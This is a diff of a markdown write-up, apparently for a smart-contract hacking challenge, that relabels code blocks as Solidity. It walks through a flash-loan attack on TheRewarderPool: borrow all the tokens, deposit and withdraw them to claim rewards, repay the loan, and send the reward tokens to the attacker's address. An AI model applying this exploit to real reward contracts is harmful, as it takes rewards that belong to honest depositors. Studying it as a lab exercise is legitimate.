@@ -14,7 +14,7 @@
 
 The TheRewarderPool mints reward tokens every time it calls `distributeRewards()` and the user has an amount of rewards larger than 0, which is computed as follows:
 
-```cs
+```solidity
 rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
 ```
 
@@ -24,7 +24,7 @@ What we have to do here is deploy an attacker contract that can perform the foll
 
 * Take a loan from the flash loaner pool of a large amount of tokens, ideally all of them:
 
-```cs
+```solidity
 flashLoanerPool.flashLoan(IERC20(pool.liquidityToken()).balanceOf(address(flashLoanerPool)));
 ```
 
@@ -32,26 +32,26 @@ Then, in its `receiveFlashLoan()` function:
 
 * Approve the spending limit of the liquidity token to equal the amount borrowed from the flash loaner pool:
 
-```cs
+```solidity
 IERC20(pool.liquidityToken()).approve(address(pool), amount);
 ```
 
 * Deposit the tokens and then withdraw them. This will call `distributeRewards()` on deposit, which will send the attacker contract all the reward tokens that correspond to it 
 
-```cs
+```solidity
 pool.deposit(amount);
 pool.withdraw(amount);
 ```
 
 * Return the tokens to the flash loaner pool
 
-```cs
+```solidity
 IERC20(pool.liquidityToken()).transfer(address(flashLoanerPool), amount);
 ```
 
 * Transfer all tokens to the attacker address, which I set up as `owner` during deployment
 
-```cs
+```solidity
 IERC20(pool.rewardToken()).transfer(address(owner), IERC20(pool.rewardToken()).balanceOf(address(this)));
 ```
 
